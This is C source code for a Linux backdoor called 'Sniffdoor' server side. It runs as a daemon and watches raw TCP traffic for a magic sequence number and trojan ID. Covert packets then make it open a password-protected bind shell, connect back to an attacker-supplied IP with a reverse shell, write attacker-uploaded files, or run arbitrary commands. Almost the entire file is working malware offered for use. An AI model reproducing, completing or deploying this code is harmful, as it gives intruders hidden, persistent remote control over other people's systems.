/*
	Sniffdoor Server Side V 1.0

	by wzt	<wzt@xsec.org>

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include "socket.h"
#include "recv.h"

void sniff_tcp_packet()
{
	struct tpacket     	*packet;
	char				file_name[100];
	int                	sock_id,fd;		
	int				   	i,r_len;
	int					pid,flag = 0;

	packet = (struct tpacket *)malloc(PACKETLEN);
	if( packet == NULL ){
		printf("[-] malloc packet");
		exit(1);
	}

	signal(SIGCHLD,SIG_IGN);

    printf("[+] !!Waiting Signal!!.\n");

	while(1){
	if( (sock_id = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) < 1 ){
		perror("[-] socket");
		exit(0);
	}

    memset(packet,0,sizeof(struct tpacket));	
	while(1){
		memset(packet,0,sizeof(struct tpacket));
		r_len = read(sock_id,packet,sizeof(struct tpacket) + DATASIZE );

		if( packet->ip.proto == IPPROTO_TCP ){
			if( ntohl(packet->tcp.th_seq) == SEQ && packet->tcp.th_flag == 2 && ntohs(packet->trojan.trojan_id) == TROJAN_ID ){		
				if( flag == 1 ){
					if( strcmp(packet->trojan.data,"DONE") == 0 ){
						close(fd);
						flag = 0;
						continue;
					}
					write(fd,packet->trojan.data,packet->trojan.datalen );
				}

				if( check_command(packet->trojan.data) == 2 ){
					flag = 1;
					strcpy(file_name,packet->trojan.data+6);
					fd = send_file(file_name);
				}

				if( flag == 0 ){
					if( pid = fork() ){
                    	waitpid(pid,NULL,NULL);
                	}
                	else{
					   if( check_command(packet->trojan.data) == 0 ){
						  strcpy(port,packet->trojan.data + 5);
   						   bindshell(htons(atoi(port)));
					   }
					   else if( check_command(packet->trojan.data) == 1 ){
						  abstract_ip(packet->trojan.data);
						  connect_back(inet_addr(ip),htons(atoi(port)));
					   }
					   else if ( check_command(packet->trojan.data) == 3 )
						  abstract_command(packet->trojan.data);
					   else
						  ;
					}
				}
			}
		}

	}
    			
	close(sock_id);
	}
}

int check_command(char *command)
{

	if( strstr(command,"BIND:") != NULL || strstr(command,"bind:") != NULL )
		return 0;
	else if( strstr(command,"BACK:") != NULL || strstr(command,"back:") != NULL )
		return 1;
	else if( strstr(command,"file:") != NULL || strstr(command,"FILE:") != NULL )
		return 2;
	else if( strstr(command,"comm:") != NULL || strstr(command,"COMM:") != NULL )
		return 3;
	else
		return 4;
}

void abstract_command(char *str)
{
	char	temp_command[1000];
    int     i = 0,j = 0,k = 0;

    strcpy(temp_command,str + 5 );
    temp_command[strlen(temp_command) ] = '\0';

    for( i = 0 ; i < strlen(temp_command) ; i++ ){
        if( temp_command[i] == ' ' ){
            command[j][k] = '\0';
            j++; k = 0;
            continue;
        }
        else{
            command[j][k++] = temp_command[i];
        }
    }

    command[j++][k] = '\0';
    *command[j] = 0;

	exec_command();
}

void exec_command()
{
	int	i = 0;

    while( *command[i] ){
        comm[i] = *(command + i );
        i++;
    }

    execvp(comm[0],comm);
}

void abstract_ip(char *str)
{
	int	i = 0,j = 0;

    for( i = 5 ; str[i] != ':' ; i++ )
    	ip[j++] = str[i];
    ip[j] = '\0';

	j = 0;i++;
	for( ; i < strlen(str) ; i ++ )
		port[j++] = str[i];
}

int send_file(char *file)
{
	int	fd;

    if( (fd = creat(file,0777)) < -1 ){
        perror("[-] creat");
        exit(1);
    }

	return fd;
}

int bindshell(int port)
{
	int		      size,flag = 1;
	int			  pid;

	listen_port(port);
	
    shell(sock_id,sock_fd);
    
   	close(sock_id);
   	close(sock_fd);

	return 1;
}

int connect_back(int ip,int port)
{
    connect_ip(ip,port);
    
    shell(sock_fd,0);

    close(sock_fd);

	return 1;
}

/* code based on bindtty.c by sd */

void shell(int sock_id,int sock_fd)
{
    fd_set      fds;
    struct      winsize ws;
    char        buf[BUF],temp[BUF];
    char        msg[] = "Can't fork pty, Starting shell without tty!\n";
    char        *envp[MAXENV];
    char        envbuf[(MAXENV+2) * ENVLEN];
    char        home[MAXENV];
    char        passwd[100];
    int         i,j,k,slen,rlen,count;
    int         subshell,tty,pty;
    unsigned    char *p, *d;
    unsigned    char wb[5];

	rlen = read(sock_id,temp,sizeof(temp));
	temp[rlen] = 0;
	if ( strcmp(temp,PASSWD) !=0 ) {
		write(sock_id,PASSERR,strlen(PASSERR));
		exit(0);
	}
            write(sock_id,BANNER,strlen(BANNER));
            envp[0]=home;
            sprintf(home, "HOME=/tmp", HOME);
            j = 0;
            do {
            	i = read(sock_id, &envbuf[j * ENVLEN], ENVLEN);
                envp[j+1] = &envbuf[j * ENVLEN];
                j++;
                if ((j >= MAXENV) || (i < ENVLEN)) break;
            } while (envbuf[(j-1) * ENVLEN] != '\n');
            envp[j+1] = NULL;

            setpgid(0, 0);

            if ( !open_tty(&tty, &pty) ) {
            	write(sock_id, msg, strlen(msg));
                if( !fork() ){
                	dup2(sock_id,0);
                    dup2(sock_id,1);
                    dup2(sock_id,2);
                    execve("/bin/sh",av,NULL);
                }
                close(sock_id);
            }

            subshell = fork();
            if(subshell == 0) {
            	close(pty);
                setsid();
                ioctl(tty, TIOCSCTTY);
                close(sock_id);
                close(sock_fd);
                signal(SIGHUP, SIG_DFL);
                signal(SIGCHLD, SIG_DFL);
                dup2(tty,0);
                dup2(tty,1);
                dup2(tty,2);
                close(tty);
                execve("/bin/sh", av, envp);
            }

            close(tty);

           	signal(SIGHUP, hangout);
           	signal(SIGTERM, hangout);

            while (1) {
            	FD_ZERO(&fds);
                FD_SET(pty, &fds);
                FD_SET(sock_id, &fds);
                if (select((pty > sock_id) ? (pty+1) : (sock_id+1),&fds, NULL, NULL, NULL) < 0){
                	break;
                }
                if (FD_ISSET(pty, &fds)) {
                	count = read(pty, buf, BUF);
                    if (count <= 0) break;
                    if (write(sock_id, buf, count) <= 0) break;
                }
               	if (FD_ISSET(sock_id, &fds)) {
                	d = buf;
                    count = read(sock_id, buf, BUF);
                    if (count <= 0) break;

                    p = memchr(buf, ECHAR, count);
                   	if (p) {
                    	rlen = count - ((long) p - (long) buf);
                        if (rlen > 5) rlen = 5;
                        	memcpy(wb, p, rlen);
                        if (rlen < 5) {
                            read(sock_id, &wb[rlen], 5 - rlen);
                        }

                        ws.ws_xpixel = ws.ws_ypixel = 0;
                        ws.ws_col = (wb[1] << 8) + wb[2];
                        ws.ws_row = (wb[3] << 8) + wb[4];
                        ioctl(pty, TIOCSWINSZ, &ws);
                        kill(0, SIGWINCH);

                        write(pty, buf, (long) p - (long) buf);
                       	rlen = ((long) buf + count) - ((long)p+5);
                        if (rlen > 0)
                    		write(pty, p+5, rlen);
                    }
                    else
                    	if (write(pty, d, count) <= 0) break;
                 }
			}
            close(sock_id);
            close(sock_fd);
            close(pty);

            waitpid(subshell, NULL, 0);
            vhangup();
			exit(0);

    close(sock_id);
	close(sock_fd);
}

void my_daemon()
{
	int	pid;

    printf("Daemon is starting..."); fflush(stdout);
    pid = fork();
    if (pid !=0 ) {
        printf("OK, pid = %d\n", pid);
        return 0;
    }

    setsid();
    chdir("/");
    pid = open("/dev/null", O_RDWR);
    dup2(pid, 0);
    dup2(pid, 1);
    dup2(pid, 2);
    close(pid);
    signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, sig_child);

}

void get_tty(int num, char *base, char *buf)
{
	char	series[] = "pqrstuvwxyzabcde";
    char    subs[] = "0123456789abcdef";
    int pos = strlen(base);
    
	strcpy(buf, base);
    buf[pos] = series[(num >> 4) & 0xF];
    buf[pos+1] = subs[num & 0xF];
    buf[pos+2] = 0;
}

int open_tty(int *tty, int *pty)
{
	char     buf[512];
    int      i, fd;

    fd = open("/dev/ptmx", O_RDWR);
    close(fd);

    for (i=0; i < 256; i++) {
    	get_tty(i, "/dev/pty", buf);
        *pty = open(buf, O_RDWR);

        if (*pty < 0)	continue;
           
		get_tty(i, "/dev/tty", buf);
        *tty = open(buf, O_RDWR);
        if (*tty < 0) {
        	close(*pty);
            continue;
        }

        return 1;
	}

    return 0;
}

void sig_child(int i)
{
	signal(SIGCHLD, sig_child);
    waitpid(-1, NULL, WNOHANG);
}

void hangout(int i)
{
	kill(0, SIGHUP);
    kill(0, SIGTERM);
}

int main(int __argc,char **__argv)
{
	daemon(0,0);

	sniff_tcp_packet();

	return 0;
}
